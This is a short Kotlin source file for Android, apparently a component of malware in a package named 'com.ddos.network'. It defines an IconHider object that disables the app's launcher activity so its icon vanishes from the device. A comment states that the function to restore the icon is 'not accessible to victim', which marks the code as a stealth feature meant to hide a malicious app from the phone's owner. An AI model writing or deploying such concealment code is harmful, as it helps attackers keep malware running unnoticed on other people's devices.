package com.ddos.network

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object IconHider {

    fun hide(context: Context) {
        // Disable launcher activity — icon disappears
        val componentName = ComponentName(context, MainActivity::class.java)
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun show(context: Context) {
        // Only for maintenance — not accessible to victim
        val componentName = ComponentName(context, MainActivity::class.java)
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
